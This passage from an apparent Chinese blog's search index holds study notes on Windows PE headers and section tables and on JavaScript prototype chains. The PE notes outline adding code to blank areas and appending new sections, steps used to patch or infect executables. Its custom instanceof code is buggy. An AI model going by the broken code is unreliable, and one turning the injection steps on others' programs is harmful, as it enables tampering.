pDelayLoad-&gt;ImportNameTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;BoundImportAddressTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;BoundImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnloadInformationTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;UnloadInformationTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TimeDateStamp: %#08x\n&quot;</span>, pDelayLoad-&gt;TimeDateStamp);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows PE</title>
      <link href="/bd80384e.html"/>
      <url>/bd80384e.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>Windows PE</strong></p><ul><li>可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件</li><li>可执行文件的格式：<ul><li>Windows 平台<br>  PE（Portable Executable）文件结构</li><li>Linux 平台<br>  ELF（Executable and Linking Format）文件结构</li></ul></li></ul></div><span id="more"></span><h2 id="PE-文件结构"><a href="#PE-文件结构" class="headerlink" title="PE 文件结构"></a>PE 文件结构</h2><h3 id="PE-文件的整体结构"><a href="#PE-文件的整体结构" class="headerlink" title="PE 文件的整体结构"></a>PE 文件的整体结构</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/05/07/iaoTSP.png' data-fancybox='default' data-caption='PE 结构示例图'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/05/07/iaoTSP.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/05/07/iaoTSP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE 结构示例图"></a><span class='image-caption'>PE 结构示例图</span></div></div><h3 id="PE-文件主要结构"><a href="#PE-文件主要结构" class="headerlink" title="PE 文件主要结构"></a>PE 文件主要结构</h3><div class="note message"><p>PE 文件结构体宽度</p></div><table><thead><tr><th>结构体</th><th>宽度(字节)</th></tr></thead><tbody><tr><td>IMAGE_DOS_HEADER</td><td>64</td></tr><tr><td>IMAGE_FILE_HEADER</td><td>20</td></tr><tr><td>INAGE_OPTIONAL_HEADER32</td><td>244</td></tr><tr><td>IMAGE_SECTION_HEADER</td><td>40</td></tr></tbody></table><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/05/07/ia9ICZ.png' data-fancybox='default' data-caption='PE 文件结构大小示例图'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/05/07/ia9ICZ.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/05/07/ia9ICZ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE 文件结构大小示例图"></a><span class='image-caption'>PE 文件结构大小示例图</span></div></div><h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><div class="note info"><p><strong>PE文件的两种状态</strong></p><ul><li>PE文件在运行前（静态，存储在磁盘上）和运行时（动态，运行在内存中）的格式是有差异的，这种差异对于我们理解PE文件是如何执行的来说很重要。</li><li>我们在之前的文件分析过程中实际上所看到的是静态的内容，其大小是要根据FileAlignment的值进行文件对齐的，但是在运行时则整体按照扩展PE头的成员SectionAlignment的值进行内存对齐，默认情况下该值为0x1000：</li></ul></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/05/07/iaQAbN.png' data-fancybox='default' data-caption='PE文件的两种状态'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/05/07/iaQAbN.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/05/07/iaQAbN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE文件的两种状态"></a><span class='image-caption'>PE文件的两种状态</span></div></div><h2 id="DOS头结构体"><a href="#DOS头结构体" class="headerlink" title="DOS头结构体"></a>DOS头结构体</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li><code>e_magic</code> 为DOS可执行文件标识符，占用2字节，值为<code>0x5A4D</code></li><li><code>e_lfanew</code> 保存了PE头的起始位置</li></ul></div><h2 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>_IMAGE_NT_HEADERS</strong></p><ul><li><code>Signature</code>: PE标识, 值为<code>0x00004550</code></li><li><code>FileHeader</code>: 文件头</li><li><code>OptionalHeader</code>: 扩展头</li></ul></div><h3 id="文件头（标准PE头）"><a href="#文件头（标准PE头）" class="headerlink" title="文件头（标准PE头）"></a>文件头（标准PE头）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>_IMAGE_FILE_HEADER</strong></p><ol><li><code>Machine</code>: 该字段为WORD类型，占用2字节，该字段标识可执行文件的目标CPU类型</li><li><code>NumberOfSections</code>: 该字段为WORD类型，占用2字节，该字段标识PE文件的节区个数</li><li><code>TimeDateStamp</code>: 该字段表示编译器填写的时间戳与文件属性中（创建时间、修改时间无关），这个值是自1970年1月1日以来用格林威治时间计算的秒数</li><li><code>PointerToSymbolTable</code>: 该字段很少使用，调试相关</li><li><code>NumberOfSymbols</code>: 该字段很少使用，调试相关</li><li><code>SizeOfOptionalHeader</code>: 该字段为WORD类型，占用2字节；该字段指定<code>IMAGE_OPTIONAL_HEADER</code>结构大小(32位PE文件：0xEO 64位PE文件：0xF0)</li><li><code>Characteristics</code>: 该字段为WORD，占用2字节；该字段指定文件属性</li></ol></div><h4 id="Machine-字段取值范围"><a href="#Machine-字段取值范围" class="headerlink" title="Machine 字段取值范围"></a><code>Machine</code> 字段取值范围</h4><table><thead><tr><th>宏定义</th><th>值</th><th>意义</th></tr></thead><tbody><tr><td>IMAGE_FILE_MACHINE_I386</td><td>0x014C</td><td>Intel</td></tr><tr><td>IMAGE_FILE_MACHINE_ALPHA</td><td>0x0184</td><td>DEC Alpha</td></tr><tr><td>IMAGE_FILE_MACHINE_IA64</td><td>0x200</td><td>Intel(64-bit)</td></tr><tr><td>IMAGE_FILE_MACHINE_AXP64</td><td>0x0284</td><td>DEC Alpha(64-bit)</td></tr><tr><td>IMAGE_FILE_MACHINE_AMD64</td><td>0x8664</td><td>AMD64 (K8)</td></tr></tbody></table><h4 id="Characteristics-字段取值范围"><a href="#Characteristics-字段取值范围" class="headerlink" title="Characteristics 字段取值范围"></a><code>Characteristics</code> 字段取值范围</h4><table><thead><tr><th>数据位</th><th>宏定义</th><th>值</th><th>为1时的含义</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_FILE_RELOCS_STRIPPED</td><td>0x0001</td><td>文件中不存在重定位信息</td></tr><tr><td>1</td><td>IMAGE_FILE_EXECUTABLE_IMAGE</td><td>0x0002</td><td>文件是可执行的</td></tr><tr><td>2</td><td>IMAGE_FILE_LINE_NUMS_STRIPPED</td><td>0x0004</td><td>不存在行信息</td></tr><tr><td>3</td><td>IMAGE_FILE_LOCAL_SYMS_STRIPPED</td><td>0x0008</td><td>不存在符号信息</td></tr><tr><td>4</td><td>IMAGE_FILE_AGGRESIVE_WS_TRIM</td><td>0x0010</td><td>调整工作集</td></tr><tr><td>5</td><td>IMAGE_FILE_LARGE_ADDRESS_AWARE</td><td>0x0020</td><td>应用程序可处理大于2GB的地址</td></tr><tr><td>6</td><td></td><td></td><td>此标志位保留</td></tr><tr><td>7</td><td>IMAGE_FILE_BYTES_REVERSED_LO</td><td>0x0080</td><td>小尾方式</td></tr><tr><td>8</td><td>IMAGE_FILE_32BIT_MACHINE</td><td>0x0100</td><td>只在32平台运行</td></tr><tr><td>9</td><td>IMAGE_FILE_DEBUG_STRIPPED</td><td>0x0200</td><td>不包含调试信息</td></tr><tr><td>10</td><td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</td><td>0x0400</td><td>不能从可移动盘运行</td></tr><tr><td>11</td><td>IMAGE_FILE_NET_RUN_FROM_SWAP</td><td>0x0800</td><td>不能从网络运行</td></tr><tr><td>12</td><td>IMAGE_FILE_SYSTEM</td><td>0x1000</td><td>系统文件（驱动程序），不能直接运行</td></tr><tr><td>13</td><td>IMAGE_FILE_DLL</td><td>0x2000</td><td>DLL文件</td></tr><tr><td>14</td><td>IMAGE_FILE_UP_SYSTEM_ONLY</td><td>0x4000</td><td>文件不能在多处理器计算机上运行</td></tr><tr><td>15</td><td>IMAGE_FILE_BYTES_REVERSED_HI</td><td>0x8000</td><td>大尾方式</td></tr></tbody></table><figure class="highlight plaintext"><figcaption><span>Characteristics 计算方式 C++</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：0102</span><br><span class="line">0000 0001 0000 0010</span><br><span class="line"></span><br><span class="line">下标是1和8位为1；表示文件是一个可执行文件，只在32平台运行</span><br></pre></td></tr></table></figure><h3 id="可选头（扩展头）"><a href="#可选头（扩展头）" class="headerlink" title="可选头（扩展头）"></a>可选头（扩展头）</h3><figure class="highlight plaintext"><figcaption><span>扩展头（32位） C++</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    WORD    Magic;                                  // 32位PE程序：10B 64位PE程序：20B 重要</span><br><span class="line">    BYTE    MajorLinkerVersion;                     // 链接器版本号</span><br><span class="line">    BYTE    MinorLinkerVersion;                     // 链接器版本号</span><br><span class="line">    DWORD   SizeOfCode;                             // 所有代码节的总和，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   SizeOfInitializedData;                  // 包含所有已经初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   SizeOfUninitializedData;                // 包含未初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用</span><br><span class="line">    DWORD   AddressOfEntryPoint;                    // 程序入口 重要</span><br><span class="line">    DWORD   BaseOfCode;                             // 代码开始的基址，编译器填的 没用</span><br><span class="line">    DWORD   BaseOfData;                             // 数据开始的基址，编译器填的 没用</span><br><span class="line">    DWORD   ImageBase;                              // 内存镜像基址 重要</span><br><span class="line">    DWORD   SectionAlignment;                       // 内存对齐 重要</span><br><span class="line">    DWORD   FileAlignment;                          // 文件对齐 重要</span><br><span class="line">    WORD    MajorOperatingSystemVersion;            // 标识操作系统版本号 主版本号</span><br><span class="line">    WORD    MinorOperatingSystemVersion;            // 标识操作系统版本号 次版本号</span><br><span class="line">    WORD    MajorImageVersion;                      // PE文件自身的版本号</span><br><span class="line">    WORD    MinorImageVersion;                      // PE文件自身的版本号</span><br><span class="line">    WORD    MajorSubsystemVersion;                  // 运行所需子系统版本号</span><br><span class="line">    WORD    MinorSubsystemVersion;                  // 运行所需子系统版本号</span><br><span class="line">    DWORD   Win32VersionValue;                      // 子系统版本值，必须位0</span><br><span class="line">    DWORD   SizeOfImage;                            // 内存中整个PE文件的映射的尺寸，可比实际的值大，必须是SectionAlignment整数倍 重要</span><br><span class="line">    DWORD   SizeOfHeaders;                          // 所有头 + 节表按照文件对齐后的大小，否则加载会出错 重要</span><br><span class="line">    DWORD   CheckSum;                               // 校验和，一些系统文件有要求用来判断文件是否被修改 重要</span><br><span class="line">    WORD    Subsystem;                              // 子系统 驱动程序（1）图形界面（2）控制台、DLL（3）</span><br><span class="line">    WORD    DllCharacteristics;                     // 文件特性 不是针对DLL文件的</span><br><span class="line">    DWORD   SizeOfStackReserve;                     // 初始化时保留的栈大小</span><br><span class="line">    DWORD   SizeOfStackCommit;                      // 初始化实际提交的大小</span><br><span class="line">    DWORD   SizeOfHeapReserve;                      // 初始化保留的堆大小</span><br><span class="line">    DWORD   SizeOfHeapCommit;                       // 初始化实际提交的大小</span><br><span class="line">    DWORD   LoaderFlags;                            // 调试相关</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;                    // 目录项目数</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li>程序真正入口：<code>ImageBase</code> 内存镜像基址 + <code>AddressOfEntryPoint</code> 程序入口</li></ul></div><h2 id="IMAGE-SECTION-HEADER-节表"><a href="#IMAGE-SECTION-HEADER-节表" class="headerlink" title="_IMAGE_SECTION_HEADER(节表)"></a>_IMAGE_SECTION_HEADER(节表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="空白区域添加代码"><a href="#空白区域添加代码" class="headerlink" title="空白区域添加代码"></a>空白区域添加代码</h2><div class="note info"><p><strong></strong></p><ul><li>构造跳转地址公式<br>  要跳转的地址 - E8指令当前的地址 - 5</li></ul></div><h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><div class="note info"><p><strong>新增节的步骤</strong></p><ol><li>判断是否有足够的空间，可以添加一个节表</li><li>在节表中新增一个成员</li><li>修改PE头中节的数量</li><li>修改SizeOfImage的大小</li><li>在原有数据的最后，新增一个节的数据（内存对齐的整数倍）</li><li>修正新增节表的属性</li></ol></div>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链的应用</title>
      <link href="/85f7c1f6.html"/>
      <url>/85f7c1f6.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><ol><li>面向对象编程思维<ul><li>提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系</li></ul></li><li>隐式原型和显式原型<ul><li>对象的隐式原型和构造函数的显式原型的连接</li></ul></li><li>原型链机制核心<br> a. new: <emp>执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型</emp><br> b. <code>[[GET]]</code></li></ol></div><span id="more"></span><h2 id="Object和Function"><a href="#Object和Function" class="headerlink" title="Object和Function"></a>Object和Function</h2><div class="note info"><p><strong>关键点</strong></p><ol><li>Object.prototype.<code>__proto__</code> &#x3D; null &#x3D;&gt; 原型链的终点; 不是所有对象都是Object的实例</li><li>Function.prototype.<code>__proto__</code> &#x3D; Object.prototype &#x3D;&gt; new Object()</li><li>Object.<code>__proto__</code> &#x3D; Function.prototype &#x3D;&gt; new Function()</li><li>Function.<code>__proto__</code> &#x3D; Function.prototype &#x3D;&gt; 指向自己, 执行前通过代码注入</li></ol></div><h2 id="instanceof方法"><a href="#instanceof方法" class="headerlink" title="instanceof方法"></a>instanceof方法</h2><div class="note info"><p><strong>instanceof</strong></p><p>a instanceof Func</p><ol><li>本质：递归</li><li>作用：判断 a 是不是 Func 的一个实例 <ul><li>s1.<code>__proto__</code> &#x3D; Student.prototype -&gt; false</li><li>Student.prototype.<code>__proto__</code> &#x3D; Object.prototype -&gt; true</li></ul></li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Student</span>(<span class="params">name, sex, age, major</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span> = sex;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">major</span> = major;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;jack&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;cs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;lucy&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;english&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自己封装instanceof</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property">myInstanceOf</span> = <span class="keyword">function</span>(<span class="params">obj, Func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj) === <span class="title class_">Fun</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">myInstanceOf</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj, <span class="title class_">Func</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Object.getPrototypeOf() -&gt; 返回对象的隐式原型</span></span><br></pre></td></tr></table></figure><h2 id="数组和类数组"><a href="#数组和类数组" class="headerlink" title="数组和类数组"></a>数组和类数组</h2><div class="note info"><p><strong>数组和类数组的区别</strong></p><p>本质上是原型链上的区别</p></div> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line">a = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">__proto__</span>: <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 类数组</span></span><br><span class="line">a = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">__proto__</span>: xxx</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><h2 id="隐式原型的修改"><a href="#隐式原型的修改" class="headerlink" title="隐式原型的修改"></a>隐式原型的修改</h2><div class="note info"><p><strong>隐式原型的修改</strong></p><ul><li>Object.getPrototypeOf(obj) -&gt; 返回参数对象的隐式原型</li><li>Object.setPrototypeOf(obj, obj) &#x2F;&#x2F; 不推荐</li><li>Object.create()   &#x2F;&#x2F; 返回一个以obj为隐式原型的值的对象<ul><li>如何得到一个没有任何属性的对象<br>  var o &#x3D; Object.create(null);</li></ul></li></ul></div><h2 id="PUT-amp-amp-GET"><a href="#PUT-amp-amp-GET" class="headerlink" title="[[PUT]]&amp;&amp;[[GET]]"></a><code>[[PUT]]</code>&amp;&amp;<code>[[GET]]</code></h2><div class="note info"><p><strong>[[PUT]]</strong></p><p>[[PUT]] -&gt; LHS 左查询</p><ol><li>判断对象中有没有属性<ul><li>如果有, 就找到并返回该地址</li></ul></li><li>如果没找到<ul><li>(1) 沿着原型链找<ul><li>A. 找到这个属性<ul><li>(a). 如果是基本类型 -&gt; 覆盖 -&gt; 在对象自身创建这个属性并返回</li><li>(b). 引用类型：<ul><li>xxx. 对引用类型的引用 -&gt; 覆盖</li><li>yyy. 对引用类型的访问 -&gt; 修改</li></ul></li></ul></li></ul></li><li>(2) 没有找到 -&gt; 直到原型链终点 -&gt; 给对象自身创建一个</li></ul></li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性并且是基本类型 </span></span><br><span class="line"><span class="comment">// bar.prototype.b = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bar.b = 2;</span></span><br><span class="line"><span class="comment">// console.log(bar)</span></span><br><span class="line"><span class="comment">/** 返回结果: b为基本类型, 会在自身创建属性并返回, 原型链上不变</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  b: 2,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object &#123;</span></span><br><span class="line"><span class="comment"> *      b: 1</span></span><br><span class="line"><span 